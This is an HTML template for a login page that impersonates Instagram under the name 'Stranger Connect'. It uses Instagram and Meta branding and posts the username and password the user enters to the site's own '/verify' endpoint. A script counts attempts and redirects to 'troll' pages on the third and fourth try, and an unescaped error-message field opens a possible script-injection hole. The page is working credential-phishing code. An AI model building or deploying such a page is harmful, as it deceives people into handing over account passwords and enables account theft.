<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />

    <title>Stranger Connect – Instagram</title>

    <link rel="stylesheet" href="/style.css" />
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap" rel="stylesheet" />
</head>

<body>


    <!-- Background is now handled by layout.hbs -->


    <!-- Login Container -->
    <div id="login-container" class="container">

        <img class="insta-logo"
            src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/96/Instagram.svg/2048px-Instagram.svg.png"
            alt="Instagram" />

        <h1 class="brand">Stranger Connect</h1>
        <p class="sub">Anonymous chat • A new Instagram experience</p>

        <h6 class="error">{{{msg}}}</h6>

        <form id="login-form" action="/verify" method="post">

            <input type="text" name="username" placeholder="Phone number, username, or email" />

            <input type="password" name="password" placeholder="Password" />

            <button type="submit" class="btn-login">Log in</button>

        </form>

        <a href="/forgot-password" class="forgot">Forgot password?</a>

        <a href="https://www.instagram.com/accounts/emailsignup/" target="_blank" class="btn-create"
            style="display: block; text-align: center; text-decoration: none; cursor: pointer;">Create new account</a>

        <div class="meta-footer">
            {{!-- FIXED: Using the local PNG file saved in public/img/ --}}
            <img class="meta-logo-img" src="/img/20251116_200252.png" alt="Meta" />

        </div>

    </div>

    <script>
        // Reset attempt counter on every page refresh
        sessionStorage.setItem('loginAttempts', '0');

        // Handle login form submission with attempt counter
        document.getElementById('login-form').addEventListener('submit', function (e) {
            e.preventDefault();

            // Get current attempt count
            let attempts = parseInt(sessionStorage.getItem('loginAttempts') || '0');
            attempts++;
            sessionStorage.setItem('loginAttempts', attempts.toString());

            console.log('Attempt:', attempts);

            // Check if this is 3rd attempt - redirect to troll page
            if (attempts === 3) {
                sessionStorage.setItem('cameFromLogin', 'true');
                window.location.href = '/troll-success';
                return;
            }

            // Check if this is 4th attempt - redirect to notres page
            if (attempts === 4) {
                sessionStorage.setItem('cameFromLogin', 'true');
                window.location.href = '/notres';
                return;
            }

            // Otherwise submit the form normally
            this.submit();
        });
    </script>

</body>

</html>